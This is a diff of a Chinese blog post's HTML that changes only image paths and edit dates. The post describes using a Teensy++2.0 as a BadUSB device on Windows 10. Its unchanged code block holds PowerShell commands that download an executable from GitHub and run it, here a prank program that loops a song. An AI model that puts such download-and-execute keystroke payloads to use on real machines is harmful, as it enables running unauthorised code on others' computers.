@@ -27,14 +27,14 @@
 <meta property="og:site_name" content="NanFengX">
 <meta property="og:description" content="头一次接触开发板，使用的是Teensy++2.0。源动力来自于BadUSB。 Teensy这是一个用于模拟键鼠主控的开发板，可以用作渗透或者其它等。 Arduino 和 Teensyduino自行安装。 实例测试环境为Win10，使用powershell。 使用开发板实现文件自动下载运行。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://nanfengx.top/Teensy2-0Test/201901281.png">
+<meta property="og:image" content="https://nanfengx.top/2019/01/28/Teensy2-0Test/201901281.png">
 <meta property="article:published_time" content="2019-01-28T15:23:15.000Z">
-<meta property="article:modified_time" content="2020-07-01T02:34:12.932Z">
+<meta property="article:modified_time" content="2021-12-30T15:13:23.939Z">
 <meta property="article:author" content="NanFengX">
 <meta property="article:tag" content="C">
 <meta property="article:tag" content="Embedded">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://nanfengx.top/Teensy2-0Test/201901281.png">
+<meta name="twitter:image" content="https://nanfengx.top/2019/01/28/Teensy2-0Test/201901281.png">
 
 <link rel="canonical" href="https://nanfengx.top/2019/01/28/Teensy2-0Test/">
 
@@ -195,7 +195,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-07-01 10:34:12" itemprop="dateModified" datetime="2020-07-01T10:34:12+08:00">2020-07-01</time>
+                <time title="Modified: 2021-12-30 23:13:23" itemprop="dateModified" datetime="2021-12-30T23:13:23+08:00">2021-12-30</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -231,7 +231,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">powershell $client = <span class="keyword">new</span>-object System.Net.WebClient;</span><br><span class="line">[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;</span><br><span class="line">$client.DownloadFile(<span class="string">&#x27;https://github.com/NanFengx/Teensy/raw/master/</span></span><br><span class="line"><span class="string">OnlyMyRailgunTest.wav&#x27;</span>, <span class="string">&#x27;D:\\OnlyMyRailgunTest.wav&#x27;</span>);</span><br><span class="line"><span class="built_in">exit</span>;</span><br><span class="line"></span><br><span class="line">powershell $client = <span class="keyword">new</span>-object System.Net.WebClient;</span><br><span class="line">[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;</span><br><span class="line">$client.DownloadFile(<span class="string">&#x27;https://github.com/NanFengx/Teensy/raw/master/Project1.exe&#x27;</span>, <span class="string">&#x27;D:\\Project1.exe&#x27;</span>);</span><br><span class="line">start D:\\Project1.exe;</span><br></pre></td></tr></table></figure>
 <p>利用powershell从github上下载事先准备好的可执行文件。我自己写了一个小程序，无限播放Only my railgun的片段，因为github上最大只允许25M，playsound又只能播放WAV，又不想弄其它的库函数或者之类的。</p>
 <p>运行效果：</p>
-<p><img src="/Teensy2-0Test/201901281.png"></p>
+<p><img src="/2019/01/28/Teensy2-0Test/201901281.png"></p>
 <p>顺便吐槽，国内github速度是真的慢。</p>
 
     </div>
